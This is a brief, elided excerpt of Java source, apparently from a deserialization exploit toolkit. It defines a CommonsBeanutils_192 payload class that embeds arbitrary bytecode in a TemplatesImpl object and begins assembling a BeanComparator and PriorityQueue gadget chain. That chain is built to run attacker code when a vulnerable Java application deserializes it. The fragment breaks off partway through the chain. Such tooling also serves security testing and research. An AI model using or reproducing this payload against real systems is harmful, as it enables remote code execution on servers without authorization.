...
public class CommonsBeanutils_192 implements ObjectPayload,BytecodePayload {
    ...
    public Object getObjectWithBytecode(byte[] bytecode) throws Exception {
        Serializer.hackSerialVersionUID(BeanComparator.class,-2044202215314119608L);
        final Object templates = TemplatesBytecodeGenerator.createTemplatesImplWithBytecode(bytecode);
        final BeanComparator comparator = new BeanComparator("lowestSetBit");
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
